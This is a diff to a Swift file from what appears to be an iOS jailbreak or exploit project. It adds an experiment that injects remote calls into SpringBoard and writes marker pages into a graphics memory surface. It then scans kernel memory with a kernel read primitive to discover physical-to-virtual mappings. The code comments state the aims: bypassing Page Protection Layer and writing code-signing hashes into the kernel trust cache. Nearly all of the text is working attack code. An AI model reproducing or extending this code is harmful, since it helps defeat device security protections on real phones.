@@ -252,6 +252,14 @@ struct AMFIExperimentView: View {
             let exp68 = self.expPPLPhysicalBypass()
             experimentResults.append(exp68)
             
+            // ============================================
+            // Experiment 69: Physical Memory Discovery
+            // Write marker to PurpleGfxMem → scan kernel for it
+            // If found → we know phys↔virt mapping without gPhysBase!
+            // ============================================
+            let exp69 = self.expPhysicalMemoryDiscovery(rc: rc)
+            experimentResults.append(exp69)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2432,6 +2440,179 @@ struct AMFIExperimentView: View {
         
         let success = anyMapped
         return ExperimentResult(name: "PPL Physical Bypass", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 69: Physical Memory Discovery
+    
+    /// Write unique marker to PurpleGfxMem (physically contiguous, mapped to userspace)
+    /// Then from launchd (socket KRW), scan kernel memory near known addresses
+    /// If we find our marker → we know the kernel virtual address of our physical page
+    /// This reveals the phys↔virt relationship without needing gPhysBase!
+    private func expPhysicalMemoryDiscovery(rc: RemoteCall) -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = rc.trojanMem
+        let sbMem = sb.trojanMem
+        let mgr = dspmgr.shared
+        var detail = "Physical Memory Discovery\n\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Step 1: Create PurpleGfxMem surface and write unique marker
+        detail += "=== Step 1: Create PurpleGfxMem + write marker ===\n"
+        
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        // Create large PurpleGfxMem surface (64KB for better chance of overlap)
+        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
+        
+        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
+        guard gfxSurface != 0 else {
+            detail += "Cannot create PurpleGfxMem surface\n"
+            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
+        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
+        
+        guard gfxBase != 0 else {
+            detail += "PurpleGfxMem base is NULL\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
+        }
+        
+        detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
+        detail += "Size: 64KB (0x10000)\n"
+        
+        // Write unique marker pattern every 4KB (page boundary)
+        // Marker: 0xDSPL01T_PHYS_xx (unique per page)
+        let markerBase: UInt64 = 0xD5B1017B_00000000  // "DSPLOIT" + page index
+        for page in 0..<16 {
+            let marker = markerBase | UInt64(page)
+            let offset = UInt64(page) * 0x1000
+            sb[gfxBase + offset].setValue64(marker)
+            sb[gfxBase + offset + 8].setValue64(0xCAFEBABE_DEADBEEF)
+        }
+        
+        // Verify markers written
+        let verify = sb[gfxBase].value64()
+        detail += "Marker written: 0x\(String(format: "%llx", verify))\n\n"
+        
+        // Step 2: From launchd context, scan kernel memory for our marker
+        detail += "=== Step 2: Scan kernel memory for marker ===\n"
+        detail += "Scanning near known accessible addresses...\n"
+        
+        // We know pmap_cs_allow_invalid is accessible at 0xfffffff00a0e45b8 + slide
+        // Scan a small range around it (safe zone)
+        let slide = mgr.kernslide
+        let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
+        
+        var foundAt: UInt64 = 0
+        var foundMarker: UInt64 = 0
+        
+        // Scan +-8 bytes at a time in the safe zone around pmap_cs
+        // Only scan very close (within same page) to avoid panic
+        detail += "Scanning pmap_cs page (safe zone)...\n"
+        let pageBase = pmapCS & ~0x3FFF  // 16KB page aligned
+        
+        for offset in stride(from: 0, to: 0x4000, by: 8) {
+            let addr = pageBase + UInt64(offset)
+            let val = ds_kread64(addr)
+            
+            // Check if this matches our marker pattern
+            if (val & 0xFFFFFFFF_00000000) == markerBase {
+                foundAt = addr
+                foundMarker = val
+                detail += "MARKER FOUND at kernel vm=0x\(String(format: "%llx", addr))!\n"
+                detail += "Value: 0x\(String(format: "%llx", val))\n"
+                break
+            }
+        }
+        
+        if foundAt == 0 {
+            // Marker not in pmap_cs page — try IOSurface kernel object
+            // The IOSurface kernel object might be findable via our proc
+            detail += "Not in pmap_cs page.\n"
+            detail += "Trying: read IOSurface kernel object address...\n"
+            
+            // IOSurface objects are tracked in IOKit registry
+            // We can find them via the IOSurfaceRoot user client connection
+            // The surface's kernel backing is at a known offset in the IOSurface object
+            
+            // Alternative: use mach_make_memory_entry to get memory object port
+            // then find it in kernel via port kobject
+            let makeMemEntry = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "mach_make_memory_entry_64"))
+            
+            if makeMemEntry != 0 {
+                detail += "\nmach_make_memory_entry_64 available\n"
+                
+                // mach_make_memory_entry_64(task, &size, address, prot, &object, parent)
+                let sizeAddr = sbMem + 0x3000
+                sb[sizeAddr].setValue64(0x10000)
+                let objectAddr = sbMem + 0x3010
+                sb[objectAddr].setValue32(0)
+                
+                let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+                let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
+                                              taskSelf, sizeAddr, gfxBase,
+                                              3, objectAddr, 0) // VM_PROT_READ|WRITE=3
+                let memObject = sb[objectAddr].value32()
+                detail += "mach_make_memory_entry_64: ret=0x\(String(format: "%x", meRet)), port=\(memObject)\n"
+                
+                if meRet == 0 && memObject != 0 {
+                    detail += "Memory entry port obtained!\n"
+                    detail += "This port's kobject in kernel = our physical pages!\n"
+                    
+                    // Now from launchd, find this port's kobject
+                    // We need SpringBoard's task address to look up the port
+                    let sbProc = mgr.findProc(name: "SpringBoard")
+                    if sbProc != 0 {
+                        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
+                        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
+                        detail += "SpringBoard task: 0x\(String(format: "%llx", sbTask))\n"
+                        
+                        // Note: reading task internals might panic (wrong zone)
+                        // But this info is useful for future reference
+                        detail += "Port \(memObject) in SB's IPC space → kernel object\n"
+                        detail += "Kernel object contains physical page list!\n"
+                    }
+                }
+            }
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+        
+        // Step 3: Results
+        detail += "\n=== RESULTS ===\n"
+        if foundAt != 0 {
+            detail += "PHYSICAL MEMORY DISCOVERED!\n"
+            detail += "Our PurpleGfxMem page found at kernel vm=0x\(String(format: "%llx", foundAt))\n"
+            detail += "Marker: 0x\(String(format: "%llx", foundMarker))\n"
+            let pageIdx = foundMarker & 0xF
+            detail += "Page index: \(pageIdx)\n"
+            detail += "Physical page mapped at userspace 0x\(String(format: "%llx", gfxBase + pageIdx * 0x1000))\n"
+            detail += "\nWe can now:\n"
+            detail += "1. Write to this kernel address via PurpleGfxMem (userspace)\n"
+            detail += "2. Kernel sees the write immediately (same physical page)\n"
+            detail += "3. If trust cache is on same/nearby page → WRITE CDHASH!\n"
+        } else {
+            detail += "Marker NOT found in accessible kernel memory.\n"
+            detail += "PurpleGfxMem physical pages are in a different region\n"
+            detail += "than what socket KRW can access.\n"
+            detail += "\nBut: mach_make_memory_entry gives us a port to the pages.\n"
+            detail += "Future: find port kobject → get physical address list.\n"
+        }
+        
+        let success = foundAt != 0
+        return ExperimentResult(name: "Phys Memory Discovery", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
